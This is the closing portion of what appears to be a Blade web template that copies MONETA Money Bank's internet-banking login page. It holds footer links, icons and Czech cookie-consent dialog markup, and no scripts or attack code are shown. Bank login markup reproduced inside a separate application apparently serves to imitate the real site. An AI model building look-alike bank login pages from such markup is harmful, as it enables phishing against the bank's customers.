                                                    d="M17.406 7.906l-3.312-3.312A2.044 2.044 0 0012.688 4H8c-1.094 0-2 .906-2 2v12c0 1.094.906 2 2 2h8c1.094 0 2-.906 2-2V9.312c0-.5-.219-1.03-.594-1.406zm-.687.719c.093.094.156.25.218.375H13.5a.494.494 0 01-.5-.5V5.062c.125.063.281.125.375.22l3.344 3.343zM17 18c0 .563-.438 1-1 1H8c-.563 0-1-.438-1-1V6c0-.563.438-1 1-1h4v3.5c0 .813.688 1.5 1.5 1.5H17v8z"></path></svg></span>Pravidla
                                    pro bezpečné používání Internet Banky</a></li>
                            <li class="styles_footer__list__item__rc_fi">
                                <button aria-label="Nastavení cookies" class="c-link c-link--small"
                                        data-testid="loginFooterCookieSettings" type="button" target="_blank"><span
                                            aria-hidden="true" class="c-icon c-icon--small c-icon--l c-icon--cookieBite"
                                            tabindex="-1" style=""><svg viewBox="0 0 24 24" class="c-icon__icon"><path
                                                    d="M9.75 10a.75.75 0 10-1.5 0 .75.75 0 001.5 0zM13 11.25a.75.75 0 100 1.5.75.75 0 000-1.5zm-3 3a.75.75 0 100 1.5.75.75 0 000-1.5zm5 0a.75.75 0 100 1.5.75.75 0 000-1.5zm4.456-2.254A3.75 3.75 0 0115.75 8.25a3.744 3.744 0 01-3.742-3.706 3.853 3.853 0 00-2.336.377l-2.026 1.03A3.91 3.91 0 005.95 7.645L4.925 9.664a3.883 3.883 0 00-.377 2.373l.355 2.233c.128.81.509 1.557 1.088 2.136l1.604 1.607a3.885 3.885 0 002.131 1.084l2.245.355a3.868 3.868 0 002.362-.374l2.025-1.032a3.855 3.855 0 001.692-1.692l1.03-2.018a3.89 3.89 0 00.376-2.34zm-1.268 1.886l-1.03 2.02a2.87 2.87 0 01-1.254 1.253l-2.025 1.033a2.874 2.874 0 01-1.752.277l-2.245-.356a2.867 2.867 0 01-1.58-.802l-1.604-1.609a2.86 2.86 0 01-.808-1.585l-.355-2.232a2.873 2.873 0 01.281-1.764L6.84 8.102a2.89 2.89 0 011.26-1.26l2.027-1.03c.309-.158.647-.258.99-.295A4.776 4.776 0 0014.84 9.16a4.784 4.784 0 003.644 3.724 2.895 2.895 0 01-.295.997z"></path></svg></span>Nastavení
                                    cookies
                                </button>
                            </li>
                            <li class="styles_footer__list__item__rc_fi"><a aria-label="Půjčka"
                                                                            class="c-link c-link--small u-vHide--tablet-max"
                                                                            data-testid="loginFooterLoan"
                                                                            href="https://www.moneta.cz/pujcky-a-uvery/pujcka-na-cokoliv"
                                                                            target="_blank"><span aria-hidden="true"
                                                                                                  class="c-icon c-icon--small c-icon--l c-icon--loan"
                                                                                                  tabindex="-1"
                                                                                                  style=""><svg
                                                viewBox="0 0 24 24" class="c-icon__icon"><path
                                                    d="M20.469 5.688C19.375 5.188 18.28 5 17.187 5 13.72 5 10.282 6.938 6.813 6.938c-.875 0-1.75-.125-2.625-.407-.093-.062-.187-.062-.28-.062-.47 0-.907.406-.907 1v9.906c0 .406.219.781.531.938 1.094.5 2.188.687 3.281.687 3.47 0 6.907-1.938 10.375-1.938.875 0 1.75.125 2.625.407.094.062.188.062.282.062.468 0 .906-.406.906-1V6.625c0-.406-.219-.781-.531-.938zM4 7.5a8.483 8.483 0 001.969.406C5.875 8.906 5.03 9.72 4 9.72V7.5zm0 9.906V16.22c1 0 1.844.75 1.969 1.718A6.137 6.137 0 014 17.407zm16-.906a8.745 8.745 0 00-2-.406c.094-1.063.938-1.875 2-1.875V16.5zm0-3.281a2.963 2.963 0 00-2.969 2.844c-1.812.03-3.593.53-5.312 1-1.656.468-3.188.906-4.75.937-.094-1.563-1.407-2.781-2.969-2.781v-4.5a2.953 2.953 0 002.969-2.781c1.812-.032 3.593-.532 5.312-1C13.906 6.468 15.47 6.063 17 6c.031 1.656 1.375 2.969 3 2.969v4.25zm0-5.25c-1.063 0-1.938-.844-2-1.938a7.025 7.025 0 012 .563v1.375zM12 8.5c-1.656 0-3 1.563-3 3.5 0 1.938 1.344 3.5 3 3.5s3-1.563 3-3.5c0-1.938-1.344-3.5-3-3.5zm0 6c-1.094 0-2-1.125-2-2.5s.906-2.5 2-2.5c1.094 0 2 1.125 2 2.5s-.906 2.5-2 2.5z"></path></svg></span>Půjčka</a>
                            </li>
                            <li class="styles_footer__list__item__rc_fi"><a aria-label="Kontakty"
                                                                            class="c-link c-link--small"
                                                                            data-testid="loginFooterContact"
                                                                            href="https://www.moneta.cz/kontakt"
                                                                            target="_blank"><span aria-hidden="true"
                                                                                                  class="c-icon c-icon--small c-icon--l c-icon--phone"
                                                                                                  tabindex="-1"
                                                                                                  style=""><svg
                                                viewBox="0 0 24 24" class="c-icon__icon"><g
                                                    clip-path="url(#phone_svg__clip0)"><path
                                                        d="M19.156 14.344l-3.187-1.375c-.594-.25-1.25-.063-1.656.406l-1.032 1.281a9.674 9.674 0 01-3.906-3.937l1.25-1.032c.5-.406.656-1.062.406-1.656L9.656 4.844a1.377 1.377 0 00-1.594-.813l-2.968.688A1.402 1.402 0 004 6.094C4 13.75 10.25 20 17.906 20c.657 0 1.219-.438 1.375-1.094l.688-2.969a1.377 1.377 0 00-.813-1.593zm-.843 4.343a.431.431 0 01-.407.313C10.781 19 5 13.219 5 6.094c0-.188.125-.344.313-.407L8.28 5h.094c.156 0 .313.094.375.25l1.375 3.187a.435.435 0 01-.125.47l-1.594 1.312c-.156.125-.219.375-.125.593a10.665 10.665 0 004.906 4.907c.22.093.47.062.594-.125L15.094 14c.125-.125.312-.188.469-.125l3.187 1.375a.441.441 0 01.25.469l-.688 2.968z"></path></g><defs><clipPath
                                                        id="phone_svg__clip0"><path transform="translate(4 4)"
                                                                                    d="M0 0h16v16H0z"></path></clipPath></defs></svg></span>Kontakty</a>
                            </li>
                            <li class="styles_footer__list__item__rc_fi"><a aria-label="www.moneta.cz"
                                                                            class="c-link c-link--small"
                                                                            data-testid="loginFooterMoneta"
                                                                            href="https://www.moneta.cz/"
                                                                            target="_blank"><span aria-hidden="true"
                                                                                                  class="c-icon c-icon--small c-icon--l c-icon--global"
                                                                                                  tabindex="-1"
                                                                                                  style=""><svg
                                                viewBox="0 0 24 24" class="c-icon__icon"><path
                                                    d="M10 7.719c0-.219-.188-.375-.406-.375a.504.504 0 00-.281.093l-.876.907c-.093.062-.124.156-.124.281 0 .219.187.375.406.375h.562a.504.504 0 00.281-.094l.313-.344c.094-.062.125-.156.125-.28v-.563zM12 4.5A7.482 7.482 0 004.5 12c0 4.156 3.344 7.5 7.5 7.5 4.156 0 7.5-3.344 7.5-7.5 0-4.156-3.344-7.5-7.5-7.5zm1.5 13.813V17.5A1.5 1.5 0 0012 16h-.625a1.34 1.34 0 01-.5-.156l-.719-.531a.502.502 0 01-.156-.344v-.75c0-.125.063-.281.188-.344l1.343-.813c.094-.03.156-.062.219-.062h.969c.125 0 .219.031.281.094l1.656 1.406h.938l.531.531c.313.313.688.469 1.094.469h.25c-.907 1.406-2.313 2.438-3.969 2.813zM18 14.5h-.75a.594.594 0 01-.406-.156l-.563-.563a.97.97 0 00-.687-.281h-.563l-1.375-1.156A1.361 1.361 0 0012.75 12h-1c-.25 0-.5.063-.719.188L9.687 13A1.39 1.39 0 009 14.219v.75c0 .437.219.875.563 1.156l.718.5c.25.219.75.375 1.094.375H12c.281 0 .5.219.5.5v.969c-.156.031-.344.031-.5.031A6.495 6.495 0 015.5 12c0-3.438 2.719-6.281 6.094-6.469l-.094.063c-.313.25-.5.593-.5.968v.75c0 .188.094.532.188.688-.032.063-.657.469-.782.563-.25.28-.406.624-.406 1.03v.5a1.4 1.4 0 001.406 1.407h.813c.344 0 .656-.094.906-.313.125.032.25.063.406.063h.406c.813 0 1-.625 1.126-.688.156.282.437.532.718.626-.125.437 0 .937.344 1.28l.563.626c.25.25.625.437 1 .437h.625c-.094.313-.188.656-.313.969zm-.281-2a.401.401 0 01-.313-.125l-.562-.594a.302.302 0 010-.437c.375-.406.312-.281.312-.563a.338.338 0 00-.093-.219l-.25-.218c-.032-.063-.125-.094-.188-.094h-.438c-.25 0-.375-.313-.187-.5l.25-.25c.031-.063.125-.063.188-.063h.28c.157 0 .282-.156.282-.312v-.313c0-.156-.125-.312-.281-.312h-.907c-.218 0-.406.188-.406.438v.156a.445.445 0 01-.281.406l-.844.281c-.125.031-.125.156-.125.25a.214.214 0 01-.219.219h-.406a.214.214 0 01-.219-.219c0-.25-.406-.281-.468-.094-.281.376-.375.563-.625.563h-.813a.414.414 0 01-.406-.406v-.531c0-.094.031-.22.125-.282.594-.437.906-.562.906-1 0-.094.063-.156.156-.187l1.063-.344c.031-.031.063-.031.094-.063l.719-.718c.156-.157.093-.469-.22-.469h-.53l-.438.594v.218a.202.202 0 01-.188.188h-.468c-.125 0-.219-.094-.219-.188v-.75c0-.062.031-.125.094-.156l1.094-.781A6.477 6.477 0 0118.5 12c0 .188 0 .344-.031.5h-.75z"></path></svg></span>www.moneta.cz</a>
                            </li>
                        </ul>
                        <ul class="styles_footer__list__3FTYc styles_footer__list--social__2qvdv">
                            <li><a aria-label="Twitter profil MONETA Money bank" class="c-link c-link--small"
                                   data-testid="loginFooterTwitter" href="https://twitter.com/MONETAMoney"
                                   target="_blank"><span aria-hidden="true"
                                                         class="c-icon c-icon--large c-icon--l c-icon--rounded c-icon--thirdPartyTwitter c-icon--twitterFill"
                                                         tabindex="-1" style=""><svg viewBox="0 0 24 24"
                                                                                     class="c-icon__icon"><path
                                                    d="M8.896 19.28c7.096 0 10.976-5.88 10.976-10.976 0-.168 0-.336-.008-.496a7.903 7.903 0 001.928-2 7.83 7.83 0 01-2.216.608 3.855 3.855 0 001.696-2.136c-.744.44-1.568.76-2.448.936A3.839 3.839 0 0016.008 4a3.858 3.858 0 00-3.856 3.856c0 .304.032.6.104.88a10.943 10.943 0 01-7.952-4.032 3.87 3.87 0 00-.52 1.936c0 1.336.68 2.52 1.72 3.208a3.79 3.79 0 01-1.744-.48v.048A3.862 3.862 0 006.856 13.2a3.846 3.846 0 01-1.744.064 3.852 3.852 0 003.6 2.68A7.754 7.754 0 013 17.536a10.748 10.748 0 005.896 1.744z"></path></svg></span></a>
                            </li>
                            <li><a aria-label="Facebook stránka MONETA Money bank" class="c-link c-link--small"
                                   data-testid="loginFooterFacebook" href="https://www.facebook.com/monetamoneybank"
                                   target="_blank"><span aria-hidden="true"
                                                         class="c-icon c-icon--large c-icon--l c-icon--rounded c-icon--thirdPartyFacebook c-icon--facebookFill"
                                                         tabindex="-1" style=""><svg viewBox="0 0 24 24"
                                                                                     class="c-icon__icon"><path
                                                    d="M17.158 2.004L14.626 2c-2.844 0-4.682 1.886-4.682 4.805v2.216H7.398A.398.398 0 007 9.419v3.21c0 .22.178.398.398.398h2.545v8.1c0 .22.179.398.399.398h3.321c.22 0 .398-.179.398-.398v-8.1h2.977c.22 0 .398-.178.398-.398l.001-3.21a.4.4 0 00-.398-.398h-2.978V7.142c0-.902.215-1.36 1.391-1.36l1.706-.001c.22 0 .398-.178.398-.398v-2.98a.4.4 0 00-.398-.399z"></path></svg></span></a>
                            </li>
                        </ul>
                        <div class="u-colorSecondary u-fontWeightNormal text-center" data-testid="TextComponent"><small
                                    class="">© 2021 MONETA Money Bank</small></div>
                    </footer>
                </main>
            </div>
        </div>
    </div>
    <div id="onetrust-consent-sdk">
        <div class="onetrust-pc-dark-filter ot-hide ot-fade-in"
             style="visibility: hidden; opacity: 0; transition: visibility 0s ease 400ms, opacity 400ms linear 0s; display: none;"></div>
        <div id="onetrust-pc-sdk" class="otPcCenter ot-hide ot-fade-in" aria-modal="true" role="dialog"
             aria-labelledby="ot-pc-title"
             style="visibility: hidden; opacity: 0; transition: visibility 0s ease 400ms, opacity 400ms linear 0s; display: none;"
             lang="cs">
            <!-- Close Button -->
            <div class="ot-pc-header">
                <!-- Logo Tag -->
                <div class="ot-pc-logo" role="img" aria-label="Moneta logo" style="background-image: url('https://cdn.cookielaw.org/logos/91ba2456-482d-488a-8af7-8ff217f7f6ee/e18e421c-79f8-461b-bf03-30abf1fd013a/7801a2c2-3165-465c-b910-0a2d0276b28a/moneta-logo-20px.png');
                    background-position: left"></div>
                <button id="close-pc-btn-handler" class="ot-close-icon" aria-label="Zavřít"></button>
            </div>
            <!-- Close Button -->
            <div id="ot-pc-content" class="ot-pc-scrollbar">
                <h3 id="ot-pc-title">Centrum předvoleb ochrany osobních údajů</h3>
                <div id="ot-pc-desc">Při návštěvě jakékoli webové stránky je
                    pravděpodobné, že stránka získá nebo uloží informace ve vašem
                    prohlížeči, a to většinou ve formě souborů cookie. Můžou to být
                    informace týkající se vás, vašich preferencí a zařízení, které
                    používáte. Většinou to slouží k vylepšování stránky, aby fungovala podle
                    vašich očekávání. Informace vás zpravidla neidentifikují jako
                    jednotlivce, ale celkově mohou pomoci přizpůsobovat prostředí vašim
                    potřebám. Respektujeme vaše právo na soukromí, a proto se můžete
                    rozhodnout, že některé soubory cookie nebudete akceptovat. Když kliknete
                    na různé tituly, dozvíte se více a budete moci nastavení změnit.
                    Nezapomínejte ale na to, že zablokováním některých souborů cookie můžete
                    ovlivnit, jak stránka funguje a jaké služby jsou vám nabízeny.
                    <br><a href="https://www.moneta.cz/ochrana-dat" class="privacy-notice-link" rel="noopener"
                           target="_blank"
                           aria-label="Další informace o&nbsp;ochraně vašich údajů, otevírá se na nové záložce.">Více
                        informací</a></div>
                <button id="accept-recommended-btn-handler">Povolit vše</button>
                <section class="ot-sdk-row ot-cat-grp">
                    <h3 id="ot-category-title">Řízení předvoleb poskytování souhlasu</h3>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0001">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0001"
                                aria-labelledby="ot-header-id-C0001"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr ot-always-active-group">
                            <div class="ot-plus-minus"><span></span><span></span></div>
                            <h4 class="ot-cat-header" id="ot-header-id-C0001">Naprosto nezbytné soubory cookie</h4>
                            <div class="ot-always-active">Vždy aktivní</div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">Jsou
                                nezbytné k tomu, aby web fungoval, takže není možné je vypnout.
                                Většinou jsou nastavené jako odezva na akce, které jste provedli, jako
                                je požadavek služeb týkajících se bezpečnostních nastavení,
                                přihlašování, vyplňování formulářů atp. Prohlížeč můžete nastavit tak,
                                aby blokoval soubory cookie nebo o nich posílal upozornění. Mějte na
                                paměti, že některé stránky bez těchto souborů nebudou fungovat. Tyto
                                soubory cookie neukládají žádné osobní identifikovatelné informace.</p>
                            <div class="ot-hlst-cntr">
                                <button class="ot-link-btn category-host-list-handler"
                                        aria-label="Podrobnosti souborů cookie Tlačítkem se otevře okno Podrobnosti o&nbsp;souborech cookie."
                                        data-parent-id="C0001">Podrobnosti souborů cookie‎
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0002">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0002"
                                aria-labelledby="ot-header-id-C0002"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr">
                            <div class="ot-plus-minus"><span></span><span></span></div>
                            <h4 class="ot-cat-header" id="ot-header-id-C0002">Analytické soubory cookie</h4>
                            <div class="ot-tgl">
                                <input type="checkbox" name="ot-group-id-C0002" id="ot-group-id-C0002"
                                       aria-checked="true"
                                       role="switch" class="category-switch-handler" data-optanongroupid="C0002"
                                       checked="checked" aria-labelledby="ot-header-id-C0002">
                                <label class="ot-switch" for="ot-group-id-C0002"><span class="ot-switch-nob"></span>
                                    <span
                                            class="ot-label-txt">Analytické soubory cookie</span></label>
                            </div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">Pomáhají
                                sledovat počet návštěvníků a také z jakého zdroje provoz pochází, což
                                nám umožňuje zlepšovat výkon stránky. Můžeme s nimi určovat, které
                                stránky jsou nejoblíbenější a které nejsou oblíbené, a také sledovat,
                                jakým způsobem se návštěvníci na webu pohybují. Všechny informace, které
                                soubory cookie shromažďují, jsou souhrnné a anonymní. Pokud soubory
                                cookie nepovolíte, nebudeme vědět, kdy jste navštívili naši stránku.</p>
                            <div class="ot-hlst-cntr">
                                <button class="ot-link-btn category-host-list-handler"
                                        aria-label="Podrobnosti souborů cookie Tlačítkem se otevře okno Podrobnosti o&nbsp;souborech cookie."
                                        data-parent-id="C0002">Podrobnosti souborů cookie‎
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0004">
                        <button aria-expanded="false" ot-accordion="true" aria-controls="ot-desc-id-C0004"
                                aria-labelledby="ot-header-id-C0004"></button>
                        <!-- Accordion header -->
                        <div class="ot-acc-hdr">
                            <div class="ot-plus-minus"><span></span><span></span></div>
                            <h4 class="ot-cat-header" id="ot-header-id-C0004">Marketingové soubory cookie</h4>
                            <div class="ot-tgl">
                                <input type="checkbox" name="ot-group-id-C0004" id="ot-group-id-C0004"
                                       aria-checked="true"
                                       role="switch" class="category-switch-handler" data-optanongroupid="C0004"
                                       checked="checked" aria-labelledby="ot-header-id-C0004">
                                <label class="ot-switch" for="ot-group-id-C0004"><span class="ot-switch-nob"></span>
                                    <span
                                            class="ot-label-txt">Marketingové soubory cookie</span></label>
                            </div>
                        </div>
                        <!-- accordion detail -->
                        <div class="ot-acc-grpcntr ot-acc-txt">
                            <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0004">Tyto
                                soubory cookies nám pomáhají personalizovat reklamu, kterou vidíte na
                                našich stránkách i stránkách našich partnerů. Na základě těchto cookies
                                můžeme my i jiní poskytovatelé vytvářet profily o Vašich zájmech a podle
                                nich Vám zobrazovat relevantní reklamy. Pokud je nepovolíte, bude se
                                Vám zobrazovat na stránkách méně cílená reklama.</p>
                            <div class="ot-hlst-cntr">
                                <button class="ot-link-btn category-host-list-handler"
                                        aria-label="Podrobnosti souborů cookie Tlačítkem se otevře okno Podrobnosti o&nbsp;souborech cookie."
                                        data-parent-id="C0004">Podrobnosti souborů cookie‎
                                </button>
                            </div>
                        </div>
                    </div>
                    <!-- Groups sections starts -->
                    <!-- Group section ends -->
                    <!-- Accordion Group section starts -->
                    <!-- Accordion Group section ends -->
                </section>
            </div>
            <section id="ot-pc-lst" class="ot-hide ot-hosts-ui ot-pc-scrollbar">
                <div id="ot-pc-hdr">
                    <h3 id="ot-lst-title">
                        <button class="ot-link-btn back-btn-handler" aria-label="Back">
                            <svg id="ot-back-arw" xmlns="http://www.w3.org/2000/svg"
                                 xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 444.531 444.531"
                                 xml:space="preserve"><title>Back Button</title>
                                <g>
                                    <path fill="#656565" d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                    l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                    c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                    s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                    L213.13,222.409z"></path>
                                </g></svg>
                        </button>
                        <span>Performance Cookies</span></h3>
                    <div class="ot-lst-subhdr">
                        <div class="ot-search-cntr">
                            <p role="status" class="ot-scrn-rdr"></p>
                            <label for="vendor-search-handler" class="ot-scrn-rdr">Vendor Search</label>
                            <input id="vendor-search-handler" type="text" placeholder="Search..."
                                   name="vendor-search-handler">
                            <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
                                 viewBox="0 -30 110 110">
                                <title>Search Icon</title>
                                <path fill="#2e3644" d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
            s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
            c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
            s-17-7.626-17-17S14.61,6,23.984,6z"></path>
                            </svg>
                        </div>
                        <div class="ot-fltr-cntr">
                            <button id="filter-btn-handler" aria-label="Filter" aria-haspopup="true">
                                <svg role="presentation" aria-hidden="true" xmlns="http://www.w3.org/2000/svg"
                                     xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 402.577 402.577"
                                     xml:space="preserve">
									<title>Filter Icon</title>
                                    <g>
                                        <path fill="#fff" d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
      c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
      c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
      C402.765,25.895,404.093,19.231,400.858,11.427z"></path>
                                    </g>
								</svg>
                            </button>
                        </div>
                        <div id="ot-anchor"></div>
                        <section id="ot-fltr-modal">
                            <div id="ot-fltr-cnt">
                                <button id="clear-filters-handler">Clear</button>
                                <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
                                    <div class="ot-fltr-opts">
                                        <div class="ot-fltr-opt">
                                            <div class="ot-chkbox">
                                                <input id="chkbox-id" type="checkbox" aria-checked="false"
                                                       class="category-filter-handler">
                                                <label for="chkbox-id"><span
                                                            class="ot-label-txt">checkbox label</span></label> <span
                                                        class="ot-label-status">label</span></div>
                                        </div>
                                    </div>
                                    <div class="ot-fltr-btns">
                                        <button id="filter-apply-handler">Apply</button>
                                        <button id="filter-cancel-handler">Cancel</button>
                                    </div>
                                </div>
                            </div>
                        </section>
                    </div>
                </div>
                <section id="ot-lst-cnt" class="ot-host-cnt ot-pc-scrollbar">
                    <div id="ot-sel-blk">
                        <div class="ot-sel-all">
                            <div class="ot-sel-all-hdr"><span class="ot-consent-hdr">Consent</span> <span
                                        class="ot-li-hdr">Leg.Interest</span>
                            </div>
                            <div class="ot-sel-all-chkbox">
                                <div class="ot-chkbox" id="ot-selall-hostcntr">
                                    <input id="select-all-hosts-groups-handler" type="checkbox" aria-checked="false">
                                    <label for="select-all-hosts-groups-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                                <div class="ot-chkbox" id="ot-selall-vencntr">
                                    <input id="select-all-vendor-groups-handler" type="checkbox" aria-checked="false">
                                    <label for="select-all-vendor-groups-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                                <div class="ot-chkbox" id="ot-selall-licntr">
                                    <input id="select-all-vendor-leg-handler" type="checkbox" aria-checked="false">
                                    <label for="select-all-vendor-leg-handler"><span
                                                class="ot-label-txt">checkbox label</span></label> <span
                                            class="ot-label-status">label</span></div>
                            </div>
                        </div>
                    </div>
                    <div class="ot-sdk-row">
                        <div class="ot-sdk-column">
                            <ul id="ot-host-lst">
                                <li class="ot-host-item">
                                    <button class="ot-host-box" aria-expanded="false"></button>
                                    <section class="ot-acc-hdr">
                                        <div class="ot-host-hdr">
                                            <h3 class="ot-host-name"></h3>
                                            <h4 class="ot-host-desc"></h4>
                                            <h4 class="ot-host-expand">View Cookies</h4></div>
                                        <!-- toggles and arrow -->
                                        <div class="ot-tgl-cntr"></div>
                                    </section>
                                    <div class="ot-acc-txt">
                                        <div class="ot-host-opts">
                                            <!-- HOST LIST VIEW UPDATE *** -->
                                            <ul class="ot-host-opt">
                                                <li class="ot-host-info">
                                                    <div>
                                                        <div>Name</div>
                                                        <div>cookie name</div>
                                                    </div>
                                                </li>
                                            </ul>
                                            <!-- HOST LIST VIEW UPDATE END *** -->
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </div>
                    </div>
                </section>
            </section>
            <div class="ot-pc-footer">
                <div class="ot-btn-container">
                    <button class="save-preference-btn-handler onetrust-close-btn-handler">Potvrdit moje volby</button>
                </div>
                <!-- Footer logo -->
                <div class="ot-pc-footer-logo">
                    <a href="https://www.onetrust.com/products/cookie-consent/" target="_blank"
                       rel="noopener noreferrer"
                       style="background-image: url('https://cdn.cookielaw.org/logos/static/poweredBy_ot_logo.svg')"
                       aria-label="Powered by OneTrust Otevírá se na nové záložce."></a>
                </div>
            </div>
            <!-- Cookie subgroup container -->
            <!-- Vendor list link -->
            <!-- Cookie lost link -->
            <!-- Toggle HTML element -->
            <!-- Checkbox HTML -->
            <!-- plus minus-->
            <!-- Arrow SVG element -->
            <!-- Accordion basic element --><span class="ot-scrn-rdr" aria-atomic="true" aria-live="polite">Vaše soukromí [`dialog closed`]</span>
            <iframe class="ot-text-resize" title="onetrust-text-resize"
                    style="position:absolute;top:-50000px;width:100em;"
                    aria-hidden="true"></iframe>
        </div>
        <div id="onetrust-banner-sdk" class="otFlat bottom ot-wo-title ot-buttons-fw" tabindex="0"
             style="bottom: 0px; visibility: hidden; opacity: 0; transition: visibility 0s ease 400ms, opacity 400ms linear 0s; display: none;">
            <div role="dialog" aria-describedby="onetrust-policy-text">
                <div class="ot-sdk-container">
                    <div class="ot-sdk-row">
                        <div id="onetrust-group-container" class="ot-sdk-eight ot-sdk-columns">
                            <div class="banner_logo"></div>
                            <div id="onetrust-policy">
                                <p id="onetrust-policy-text">Naše stránky využívají soubory
                                    cookies. Tyto soubory slouží k zajištění funkčnosti, přizpůsobení
                                    stránek vašim potřebám, cílení reklamy a k analýze využití stránek a
                                    zajištění jejich bezpečnosti.</p>
                            </div>
                        </div>
                        <div id="onetrust-button-group-parent" class="ot-sdk-three ot-sdk-columns">
                            <div id="onetrust-button-group">
                                <button id="onetrust-pc-btn-handler" class="cookie-setting-link">Nastavení souborů
                                    cookie
                                </button>
                                <button id="onetrust-accept-btn-handler">Rozumím</button>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Close Button -->
                <div id="onetrust-close-btn-container">
                    <button class="onetrust-close-btn-handler onetrust-close-btn-ui banner-close-button ot-close-icon"
                            aria-label="Zavřít"></button>
                </div>
                <!-- Close Button END-->
            </div>
        </div>
        <div id="ot-sdk-btn-floating" title="Nastavení souborů cookie" class="ot-floating-button"
             style="display: none;">
            <div class="ot-floating-button__front">
                <button type="button" class="ot-floating-button__open">
                    <svg role="presentation" xmlns="http://www.w3.org/2000/svg">
                        <path class="ot-floating-button__svg-fill"
                              d="M14.588 0l.445.328c1.807 1.303 3.961 2.533 6.461 3.688 2.015.93 4.576 1.746 7.682 2.446 0 14.178-4.73 24.133-14.19 29.864l-.398.236C4.863 30.87 0 20.837 0 6.462c3.107-.7 5.668-1.516 7.682-2.446 2.709-1.251 5.01-2.59 6.906-4.016zm5.87 13.88a.75.75 0 00-.974.159l-5.475 6.625-3.005-2.997-.077-.067a.75.75 0 00-.983 1.13l4.172 4.16 6.525-7.895.06-.083a.75.75 0 00-.16-.973z"
                              fill="#FFF" fill-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="ot-floating-button__back">
                <button type="button" class="ot-floating-button__close">
                    <svg role="presentation" viewBox="0 0 24 24" version="1.1" xmlns="http://www.w3.org/2000/svg"
                         aria-hidden="true">
                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                            <g id="Banner_02" class="ot-floating-button__svg-fill"
                               transform="translate(-318.000000, -725.000000)" fill="#ffffff" fill-rule="nonzero">
                                <g id="Group-2" transform="translate(305.000000, 712.000000)">
                                    <g id="icon/16px/white/close">
                                        <polygon id="Line"
                                                 points="13.3333333 14.9176256 35.0823744 36.6666667 36.6666667 35.0823744 14.9176256 13.3333333"></polygon>
                                        <polygon id="Line"
                                                 transform="translate(25.000000, 25.000000) scale(-1, 1) translate(-25.000000, -25.000000) "
                                                 points="13.3333333 14.9176256 35.0823744 36.6666667 36.6666667 35.0823744 14.9176256 13.3333333"></polygon>
                                    </g>
                                </g>
                            </g>
                        </g>
                    </svg>
                </button>
            </div>
        </div>
    </div>
@endsection
@push('js')
@endpush